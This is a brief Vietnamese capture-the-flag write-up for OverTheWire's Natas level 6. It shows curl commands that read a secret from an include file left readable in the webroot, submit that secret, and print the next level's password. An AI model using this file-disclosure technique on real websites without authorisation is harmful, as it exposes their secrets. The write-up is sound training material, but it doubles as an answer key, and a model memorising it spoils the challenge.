# Natas 6 → 7

## Mục tiêu

Lấy secret trong file include.

## Tôi thấy

Source lộ `includes/secret.inc`; file trả `$secret = "FOEIUWGHFEEUHOFUOIU"`.

## Cách làm

```bash
curl -u natas6:<password> http://natas6.natas.labs.overthewire.org/includes/secret.inc
curl -u natas6:<password> -d "secret=FOEIUWGHFEEUHOFUOIU&submit=1" http://natas6.natas.labs.overthewire.org/
```

## Vì sao cách này hiệu quả

File include nằm trong webroot và có thể đọc trực tiếp.

## Kết quả

Password của `natas7`:

```text
B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
```
